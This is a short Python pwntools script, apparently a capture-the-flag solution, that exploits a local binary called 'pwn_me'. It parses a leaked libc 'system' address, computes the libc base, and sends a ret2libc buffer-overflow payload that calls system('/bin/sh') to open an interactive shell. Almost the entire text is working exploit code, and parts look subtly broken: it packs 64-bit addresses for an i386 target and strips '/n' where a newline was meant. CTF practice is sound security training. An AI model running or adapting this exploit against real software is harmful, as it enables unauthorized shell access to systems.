from pwn import *

e = ELF('./pwn_me')
context(os="linux", arch="i386")
context.binary = e
libc = ELF("libc.so.6")
p = e.process()
p.recvline()
leak = p.recvline()[-11:].rstrip(b"/n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']
junk = b"A" * 32 
payload = junk + p64(libc.symbols['system']) + p64(next(libc.search(b'/bin/sh\x00')))
p.sendline(payload)
p.interactive()
